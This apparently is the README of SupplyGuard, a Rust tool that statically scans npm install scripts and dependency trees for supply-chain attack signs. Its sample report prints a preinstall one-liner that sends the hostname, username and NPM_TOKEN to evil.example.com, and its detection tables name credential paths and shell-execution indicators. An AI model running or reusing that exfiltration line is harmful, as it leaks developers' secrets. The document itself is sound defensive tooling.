# SupplyGuard

A static analysis tool that scans npm `package.json` files and their entire dependency tree for supply chain attack indicators — before installation runs.

## The Problem

Every time you run `npm install`, lifecycle scripts like `preinstall` execute arbitrary code before you even see what's inside. That's how attacks like [ua-parser-js](https://github.com/nickvdp/malicious-packages) (CVE-2021-41265), [eslint-scope](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/), and [crossenv](https://blog.npmjs.org/post/163723642530/crossenv-malware-on-the-npm-registry) stole credentials from thousands of developers.

SupplyGuard intercepts this by statically analysing packages and their transitive dependencies before any code runs.

## How It Works

```
package.json
     │
     ▼
  Parser            Reads and validates the file (max 1 MB)
     │
     ▼
  Analyzer          Extracts preinstall / install / postinstall scripts
     │
     ▼
  ThreatDetector    Matches 31 regex patterns across 5 threat categories
     │
     ▼
  RiskScorer        Aggregates weighted scores → 0–100, Low/Medium/High/Critical
     │
     ▼
  Registry Checker  Queries registry.npmjs.org for each dependency:
     │              typosquatting, publish age, download count, maintainer signals
     │
     ▼
  Recursive Scanner Walks the full dependency tree (configurable depth)
     │              with cycle detection and visited-set deduplication
     │
     ▼
  Report            Per-script findings + dependency tree + PASS / SUSPICIOUS / BLOCK
```

## Features

- **Install script analysis** — 31 regex patterns across 5 threat categories scan `preinstall`, `install`, and `postinstall` scripts
- **Typosquat detection** — flags package names within edit distance 1 of popular packages (e.g. `crossenv` → `cross-env`) using Optimal String Alignment distance
- **Registry metadata checks** — queries the npm registry for newly published versions (< 7 days), low download count + single maintainer combinations, and other trust signals
- **Recursive dependency scanning** — walks the full `dependencies` tree from the npm registry up to a configurable depth, running the full analysis pipeline on every transitive dependency
- **Cycle detection** — visited-set deduplication ensures each package is scanned at most once, regardless of how many places it appears in the tree

## Threat Categories

| Category | What it detects | Example indicators |
|---|---|---|
| **Network Activity** | Outbound connections | `fetch()`, `axios`, `XMLHttpRequest`, hardcoded URLs |
| **Data Exfiltration** | Credential and secret theft | `process.env.GITHUB_TOKEN`, `.ssh/`, `.aws/`, `.npmrc` |
| **Process Execution** | Shell and command execution | `child_process.exec`, `eval()`, `Function()`, `bash` |
| **File System Tampering** | Dangerous writes and traversal | `fs.writeFile`, `../`, `/etc/`, `C:\Windows` |
| **Obfuscation** | Attempts to hide intent | `atob()`, `String.fromCharCode`, hex arrays, `\xNN` |

Each pattern carries a risk weight (5–35). The total is capped at 100 and mapped to a severity level:

| Score | Severity |
|---|---|
| 0 – 20 | Low |
| 21 – 50 | Medium |
| 51 – 75 | High |
| 76 – 100 | Critical |

A confidence score (0–1) reflects both the number and diversity of threat categories detected. The final verdict combines script analysis and registry signals across the entire dependency tree:

- **BLOCK** — Critical severity, High with confidence > 60%, or a HIGH-risk registry finding (typosquat, newly published) anywhere in the tree
- **SUSPICIOUS** — Score > 25, or score > 15 with confidence > 50%, or WARNING-level registry findings
- **PASS** — Below all thresholds

## Installation

Requires [Rust](https://rustup.rs/) (edition 2021).

```bash
git clone https://github.com/thil4n/supplygaurd
cd supplygaurd
cargo build --release
```

The binary is at `target/release/supplygaurd`.

## Usage

```bash
# Scan a package.json with full dependency tree (default depth 2)
supplygaurd package.json

# Scan deeper into transitive dependencies
supplygaurd package.json --depth 3

# Direct dependencies only
supplygaurd package.json --depth 0

# Skip registry checks (offline / air-gapped environments)
supplygaurd package.json --offline

# Defaults to ./package.json if no argument given
supplygaurd
```

### Example — malicious package with typosquat dependency

```
Scanning: datasets/malicious/deep-chain/package.json
Scanning dependency tree (max depth 0)...
  [depth 0] lodash ... OK
  [depth 0] express ... OK
  [depth 0] crossenv ... HIGH

SupplyGuard Analysis Report
==================================================
Package : totally-safe-analytics v2.0.0
File    : datasets/malicious/deep-chain/package.json

[CRITICAL] preinstall script
  Script    : node -e "const h=require('https');const os=require('os');h.get('https://evil.example.com/c?h='+os.hostname()+'&u='+os.userInfo().username+'&t='+process.env.NPM_TOKEN)"
  Risk Score: 90/100  |  Confidence: 52%  |  Threats: 6
  Indicators:
    • [Network      ] HTTP client import                  — require('https')
    • [Network      ] Hardcoded URL                       — https://evil.example.com/c?h=
    • [Exfiltration ] Environment variable access         — process.env
    • [Exfiltration ] Sensitive env var                   — NPM_TOKEN
    • [Exfiltration ] System info collection              — os.hostname
    • [Exfiltration ] System info collection              — os.userInfo

Dependency Tree Scan (3 scanned, 0 skipped)
==================================================
  [HIGH] crossenv v0.0.2-security
    • Possible typosquat of 'cross-env' (edit distance 1)

  2 / 3 dependencies clean

==================================================
VERDICT: BLOCK — Do not install this package.
```

### Example — clean package

```
Scanning: package.json

SupplyGuard Analysis Report
==================================================
Package : my-package v1.0.0
File    : package.json

No install scripts found — nothing to analyze.

Dependency Tree Scan (12 scanned, 0 skipped)
==================================================
  12 / 12 dependencies clean

==================================================
VERDICT: PASS — No significant threats detected.
```

### Exit codes

| Code | Meaning |
|---|---|
| `0` | PASS or SUSPICIOUS |
| `1` | BLOCK — do not install |

Use exit code 1 to block installation in CI:

```bash
supplygaurd package.json || exit 1
```

## Tested Against Real Attacks

SupplyGuard is tested against reconstructed samples from publicly documented npm supply chain incidents:

| Attack | Year | Vector | SupplyGuard detection |
|---|---|---|---|
| **crossenv** typosquat | 2017 | Typosquat of `cross-env`, stole npm tokens | Typosquat detected (edit distance 1) |
| **eslint-scope** | 2018 | Compromised account, stole `~/.npmrc` tokens | Known gap (payload in separate file) |
| **event-stream / flatmap-stream** | 2018 | Obfuscated payload in minified source | Known gap (no install script) |
| **ua-parser-js** (CVE-2021-41265) | 2021 | Compromised account, cryptominer download | Known gap (payload in separate file) |
| **coa / rc** | 2021 | Compromised account, obfuscated downloader | Known gap (payload in separate file) |
| **Inline exfiltration** | Common | `process.env` + `https.get` in preinstall | Detected — Network + Exfiltration |
| **Reverse shell** | Common | `child_process.exec('bash...')` in postinstall | Detected — Execution |
| **Dependency confusion** | Common | Internal name + `curl` + `dns.lookup` | Detected — Network + Exfiltration |
| **Discord token stealer** | 2022–23 | `postinstall` reads token paths + sends via webhook | Known gap (payload in separate file) |

"Known gap" means the malicious code is in a separate `.js` file referenced by the install script (e.g. `"postinstall": "node malware.js"`). SupplyGuard currently scans the script string, not referenced files. Closing this gap via JS file scanning is on the roadmap.

## Project Structure

```
src/
├── main.rs                  CLI argument parsing, orchestration
├── parser/
│   ├── mod.rs               File reading, size validation, JSON parsing
│   └── package_json.rs      PackageJson struct (serde + from_registry constructor)
├── analyser/
│   ├── mod.rs               Pipeline: extract scripts → detect → score → AnalysisResult
│   ├── threat.rs            ThreatDetector — 31 regex patterns, 5 categories
│   └── risk_score.rs        RiskScore — weighted aggregation, severity, confidence
├── registry/
│   ├── mod.rs               RegistryChecker — npm API queries, metadata risk assessment
│   └── typosquat.rs         Popular package list + OSA distance algorithm
├── scanner/
│   └── mod.rs               Recursive dependency tree walker with cycle detection
└── report.rs                Report struct, Verdict enum, tree rendering

datasets/
├── benign/                  Sample clean packages
└── malicious/               9 attack samples based on real incidents
    ├── package.json         Inline credential exfiltration
    ├── ua-parser-js/        CVE-2021-41265 cryptominer (delegated payload)
    ├── crossenv/            2017 npm token theft typosquat (delegated payload)
    ├── coa/                 2021 obfuscated downloader (delegated payload)
    ├── eslint-scope/        2018 npmrc token theft (delegated payload)
    ├── exfil-inline/        Generic env exfiltration pattern
    ├── reverse-shell/       Reverse shell via child_process
    ├── dependency-confusion/ Internal name hijack with DNS exfil
    ├── discord-stealer/     Discord token stealer campaign (delegated payload)
    ├── obfuscated-payload/  flatmap-stream (payload in source, no install script)
    └── deep-chain/          Malicious preinstall + crossenv typosquat dependency

tests/
└── integration.rs           16 end-to-end tests via the compiled binary
```

## Running Tests

```bash
cargo test
```

90 tests across 7 modules:

| Module | Tests | What they cover |
|---|---|---|
| `parser` | 6 | File parsing, validation, error handling |
| `analyser` | 8 | Script extraction, sorting, verdict logic |
| `threat` | 11 | All 5 threat categories, edge cases, parametric tests |
| `risk_score` | 8 | Severity boundaries, score capping, confidence, thresholds |
| `registry` | 10 | Date parsing, risk levels, combined signals |
| `typosquat` | 11 | OSA distance, all edit operations, false positive suppression |
| `report` | 6 | Verdict logic (offline, nested, combined signals), formatting |
| `scanner` | 6 | Tree traversal, block/suspicious propagation, visited set |
| `integration` | 16 | End-to-end binary tests against all 9 attack samples |

## Limitations

- **Static analysis only** — SupplyGuard reads scripts as plain text. Attackers can evade pattern matching by downloading and executing a second-stage payload, using dynamic `require()`, or splitting strings at runtime.
- **Install scripts only** — Malicious code in the package's JavaScript source files is not scanned. 4 of 9 real-world attack samples bypass the scanner because they delegate to a separate `.js` file.
- **Latest version only** — The recursive scanner resolves to the `latest` dist-tag. It does not resolve semver ranges to specific versions.
- **Sequential fetching** — Registry queries are synchronous. Deep trees with many packages can take time.
- **False positives** — Legitimate packages (build tools, native addons) may use `child_process` or write to the filesystem. Always verify a SUSPICIOUS verdict before discarding a package.

## Roadmap

- [ ] Scan JavaScript files inside the package tarball (closes the delegated-payload gap)
- [ ] AST-based analysis via SWC (already a dependency) for higher precision
- [ ] JSON output mode for CI integration
- [ ] npm lifecycle hook integration (`npx supplygaurd` as a global pre-install hook)
- [x] ~~Dependency graph traversal via the npm registry API~~
- [x] ~~Typosquat detection~~
- [x] ~~Registry metadata checks (age, downloads, maintainers)~~
- [x] ~~Recursive transitive dependency scanning~~

## License

[MIT](LICENSE)
